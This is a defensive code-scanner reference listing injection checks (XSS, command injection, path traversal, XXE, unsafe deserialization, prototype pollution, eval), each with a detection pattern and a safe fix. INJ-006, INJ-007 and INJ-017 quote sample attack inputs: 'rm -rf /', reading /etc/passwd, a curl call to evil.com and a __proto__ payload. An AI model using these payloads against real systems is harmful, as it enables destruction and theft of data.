# Injection Prevention Checks (INJ-001 to INJ-021)

21 checks for XSS, command injection, path traversal, deserialization, and code injection.

---

### INJ-001: dangerouslySetInnerHTML Without Sanitization
- **Severity:** CRITICAL
- **CWE:** CWE-79 (Cross-site Scripting)
- **Pattern:** `dangerouslySetInnerHTML` present without `DOMPurify`, `dompurify`, `sanitize-html`, or `isomorphic-dompurify` import in the same file
- **Why:** React escapes JSX by default. `dangerouslySetInnerHTML` bypasses that protection entirely. Any user content becomes executable JavaScript.
- **Fix:**
```jsx
import DOMPurify from "dompurify";

// Sanitize before rendering
<div dangerouslySetInnerHTML={{ __html: DOMPurify.sanitize(userContent) }} />
```
- **False positives:** When content is known-safe (e.g., hardcoded HTML strings, trusted CMS output). The check flags all usage without a sanitizer import, since "trusted" sources can be compromised.

---

### INJ-002: innerHTML Assignment With Dynamic Content
- **Severity:** CRITICAL
- **CWE:** CWE-79 (Cross-site Scripting)
- **Pattern:** `.innerHTML = ` followed by dynamic content (not a simple string literal)
- **Why:** Direct innerHTML assignment is the classic DOM XSS vector. Unlike React, vanilla JS has no built-in escaping.
- **Fix:**
```javascript
// For plain text (most cases)
element.textContent = userInput;

// For HTML that must be rendered
import DOMPurify from "dompurify";
element.innerHTML = DOMPurify.sanitize(userContent);
```
- **False positives:** Assignments of static HTML strings (e.g., `el.innerHTML = "<p>Loading...</p>"`). The regex excludes simple quoted strings without interpolation.

---

### INJ-003: Vue v-html Directive
- **Severity:** CRITICAL
- **CWE:** CWE-79 (Cross-site Scripting)
- **Pattern:** `v-html=` without DOMPurify/sanitize-html import
- **Why:** Vue's `v-html` renders raw HTML, same as innerHTML. Vue's template syntax (`{{ }}`) auto-escapes, but `v-html` does not.
- **Fix:**
```vue
<template>
  <!-- BAD -->
  <div v-html="userContent" />

  <!-- GOOD: sanitize in computed property -->
  <div v-html="sanitizedContent" />
</template>

<script setup>
import DOMPurify from "dompurify";
const sanitizedContent = computed(() => DOMPurify.sanitize(userContent.value));
</script>
```
- **False positives:** Rendering trusted content from a CMS or static source. The check cannot distinguish trusted from untrusted data sources.

---

### INJ-004: Angular [innerHTML] Binding
- **Severity:** CRITICAL
- **CWE:** CWE-79 (Cross-site Scripting)
- **Pattern:** `[innerHTML]` attribute binding
- **Why:** Angular's built-in sanitizer strips dangerous tags, but developers often bypass it with `bypassSecurityTrustHtml()` to "fix" rendering issues. This defeats Angular's protection.
- **Fix:**
```typescript
// Angular sanitizes [innerHTML] by default. The risk is bypassing it.
// BAD: defeats Angular's sanitizer
this.content = this.sanitizer.bypassSecurityTrustHtml(userInput);

// GOOD: let Angular's sanitizer work, or use DOMPurify for more control
import DOMPurify from "dompurify";
this.content = DOMPurify.sanitize(userInput);
```
- **False positives:** Angular's default sanitization handles most cases safely. This check flags all `[innerHTML]` usage as a prompt to verify that `bypassSecurityTrust*` is not being used with user input.

---

### INJ-005: Svelte {@html} Tag
- **Severity:** CRITICAL
- **CWE:** CWE-79 (Cross-site Scripting)
- **Pattern:** `{@html ` without DOMPurify/sanitize-html import
- **Why:** Svelte provides zero built-in HTML sanitization. `{@html}` is raw insertion with no safety net.
- **Fix:**
```svelte
<script>
  import DOMPurify from "dompurify";
  export let content;
  $: safe = DOMPurify.sanitize(content);
</script>

{@html safe}
```
- **False positives:** Rendering static HTML or markdown converted server-side. The check has no way to determine the content source.

---

### INJ-006: Command Injection
- **Severity:** CRITICAL
- **CWE:** CWE-78 (OS Command Injection)
- **Pattern:** Shell execution (`child_process.exec`, `execSync`, `os.system`, `subprocess.call/run/Popen` with `shell=True`, `spawn`) combined with user input (`req.`, `params.`, `${}`, string concatenation)
- **Why:** Attackers inject shell metacharacters: `; rm -rf /`, `| cat /etc/passwd`, `` `curl evil.com` ``. Full server compromise.
- **Fix:**
```javascript
// BAD: shell interprets metacharacters
exec(`convert ${req.body.filename} output.png`);

// GOOD: execFile/spawn with argument array (no shell)
const { execFile } = require("child_process");
execFile("convert", [req.body.filename, "output.png"], (err, stdout) => {
  // filename is a single argument, not shell-interpreted
});

// ALSO GOOD: validate input
const allowedChars = /^[a-zA-Z0-9_\-\.]+$/;
if (!allowedChars.test(filename)) throw new Error("Invalid filename");
```
- **False positives:** `exec` used for database operations (e.g., Sequelize's `exec`). The pattern requires user input indicators in the same expression, but some `exec` calls in non-shell contexts may match.

---

### INJ-007: Path Traversal
- **Severity:** CRITICAL
- **CWE:** CWE-22 (Path Traversal)
- **Pattern:** File system operations (`readFile`, `writeFile`, `createReadStream`, `open`, `path.join`, `path.resolve`, `fs.*`) with user input
- **Why:** `../../etc/passwd` or `....//....//etc/passwd` bypasses naive checks. Attackers read config files, source code, or overwrite critical files.
- **Fix:**
```javascript
const path = require("path");
const UPLOAD_DIR = path.resolve(__dirname, "uploads");

function safeFilePath(userInput) {
  // Resolve to absolute path
  const resolved = path.resolve(UPLOAD_DIR, userInput);
  // Verify it's still within the allowed directory
  if (!resolved.startsWith(UPLOAD_DIR + path.sep)) {
    throw new Error("Path traversal detected");
  }
  return resolved;
}
```
- **False positives:** `path.join` with user input that is subsequently validated. Server code reading config files where the "user" variable name matches input keywords incidentally.

---

### INJ-010: XML External Entity (XXE)
- **Severity:** CRITICAL
- **CWE:** CWE-611 (Improper Restriction of XML External Entity Reference)
- **Pattern:** XML parsing indicators (`<!ENTITY`, `SYSTEM`, `parseXML`, `xml2js`, `DOMParser`, `XMLReader`, `etree.parse`) without safe configuration (`disallow_dtd`, `resolve_externals: false`, `FEATURE_SECURE_PROCESSING`)
- **Why:** XXE lets attackers read local files (`file:///etc/passwd`), perform SSRF, and in some cases achieve remote code execution.
- **Fix:**
```javascript
// Node.js with xml2js (safe by default since v0.4.19)
const xml2js = require("xml2js");
const parser = new xml2js.Parser(); // DTD processing disabled by default

// Python
import defusedxml.ElementTree as ET  // Use defusedxml instead of xml.etree
tree = ET.parse(source)

// Java
factory.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
```
- **False positives:** Modern XML libraries that are safe by default (xml2js, defusedxml). The check flags all XML parsing without explicit safe configuration as a reminder to verify.

---

### INJ-011: Unsafe Deserialization (pickle / YAML)
- **Severity:** CRITICAL
- **CWE:** CWE-502 (Deserialization of Untrusted Data)
- **Pattern:** `pickle.load()` or `pickle.loads()` for Python pickle; `yaml.load()` or `yaml.unsafe_load()` without `Loader=yaml.SafeLoader` for YAML
- **Why:** Both pickle and unsafe YAML can execute arbitrary code during deserialization. A crafted payload achieves full RCE.
- **Fix:**
```python
# BAD: pickle with untrusted data
data = pickle.loads(request.data)  # RCE

# GOOD: Use JSON for data exchange
data = json.loads(request.data)

# BAD: unsafe YAML
config = yaml.load(file_content)

# GOOD: SafeLoader
config = yaml.safe_load(file_content)
# or
config = yaml.load(file_content, Loader=yaml.SafeLoader)
```
- **False positives:** `pickle.load()` on trusted local files (e.g., ML model weights). Still flagged because the model file itself could be tampered with in a supply chain attack.

---

### INJ-013: File Upload Without Type Validation
- **Severity:** WARNING
- **CWE:** CWE-434 (Unrestricted Upload of File with Dangerous Type)
- **Pattern:** File upload handlers (`multer`, `formidable`, `busboy`, `multipart`, `upload`) without type checking (`mimetype`, `content_type`, `file_type`, `allowed_types`, `accept`, `file_filter`)
- **Why:** Without type validation, attackers upload `.php`, `.jsp`, or `.html` files that execute server-side or deliver XSS.
- **Fix:**
```javascript
const upload = multer({
  fileFilter: (req, file, cb) => {
    const allowed = ["image/jpeg", "image/png", "image/webp"];
    if (!allowed.includes(file.mimetype)) {
      return cb(new Error("Invalid file type"), false);
    }
    cb(null, true);
  },
  // Also validate by extension (mimetype can be spoofed)
  // And use magic bytes validation for defense in depth
});
```
- **False positives:** Upload handlers where type checking happens in a separate middleware or validation layer not in the same file.

---

### INJ-014: File Upload Without Size Limit
- **Severity:** WARNING
- **CWE:** CWE-400 (Uncontrolled Resource Consumption)
- **Pattern:** File upload handlers present without size limiting keywords (`maxFileSize`, `fileSizeLimit`, `limits`, `max_size`, `limit`)
- **Why:** Without size limits, attackers upload multi-GB files to exhaust disk space and memory, causing denial of service.
- **Fix:**
```javascript
const upload = multer({
  limits: {
    fileSize: 5 * 1024 * 1024, // 5 MB
    files: 5, // Max 5 files per request
  },
});

// Also set body parser limits
app.use(express.json({ limit: "1mb" }));
```
- **False positives:** Upload handlers where size limits are configured at the reverse proxy level (nginx `client_max_body_size`) rather than in application code.

---

### INJ-017: Prototype Pollution
- **Severity:** CRITICAL
- **CWE:** CWE-1321 (Improperly Controlled Modification of Object Prototype Attributes)
- **Pattern:** Deep merge functions (`deepMerge`, `_.merge`, `lodash.merge`, `Object.assign`, `spread`) receiving user input (`req.`, `body.`, `input`, `user`, `params`)
- **Why:** Attackers inject `{ "__proto__": { "isAdmin": true } }` through merge operations. This modifies the prototype of ALL objects, potentially granting admin access or causing crashes.
- **Fix:**
```javascript
// BAD: merge user input into config
_.merge(config, req.body);

// GOOD: Strip dangerous keys before merging
function safeMerge(target, source) {
  const cleaned = JSON.parse(JSON.stringify(source));
  delete cleaned.__proto__;
  delete cleaned.constructor;
  delete cleaned.prototype;
  return Object.assign(target, cleaned);
}

// BETTER: Use Object.create(null) for option bags
const options = Object.create(null);
options.name = req.body.name;
options.email = req.body.email;
```
- **False positives:** `Object.assign` with server-side data that happens to use a variable named matching input keywords. The pattern is broad to catch prototype pollution vectors through various merge utilities.

---

### INJ-019: GraphQL Introspection in Production
- **Severity:** WARNING
- **CWE:** CWE-200 (Exposure of Sensitive Information)
- **Pattern:** GraphQL introspection indicators (`introspection: true`, `__schema`, `__type`) in files that also contain production context (`production`, `prod`)
- **Why:** Introspection exposes your entire API schema, including internal types, mutations, and fields. Attackers map your API surface before attacking.
- **Fix:**
```javascript
const server = new ApolloServer({
  schema,
  introspection: process.env.NODE_ENV !== "production",
  plugins: [
    process.env.NODE_ENV === "production"
      ? ApolloServerPluginLandingPageDisabled()
      : ApolloServerPluginLandingPageLocalDefault(),
  ],
});
```
- **False positives:** Code that checks `__schema` as part of client-side caching logic. Files that mention "production" in comments while configuring development settings. The check requires both introspection and production context.

---

### INJ-021: eval / new Function / setTimeout(string)
- **Severity:** CRITICAL
- **CWE:** CWE-95 (Eval Injection)
- **Pattern:** `eval(`, `new Function(`, or `setTimeout("string"` (setTimeout with a string argument instead of function reference)
- **Why:** All three execute arbitrary JavaScript. If any input reaches these functions, attackers achieve full code execution in the runtime.
- **Fix:**
```javascript
// BAD
eval(req.body.expression);
const fn = new Function("return " + userInput);
setTimeout("doSomething('" + data + "')", 1000);

// GOOD: JSON.parse for data
const data = JSON.parse(req.body.data);

// GOOD: function reference for setTimeout
setTimeout(doSomething, 1000);
setTimeout(() => doSomething(data), 1000);

// If you need dynamic math: use a safe expression parser
const { evaluate } = require("mathjs");
const result = evaluate(expression); // sandboxed
```
- **False positives:** `eval` in build tools (webpack configs, babel plugins) where input is developer-controlled. `new Function` in template engines operating on trusted templates. The `(?<!\w)` lookbehind on eval prevents matching `medieval` or similar words.
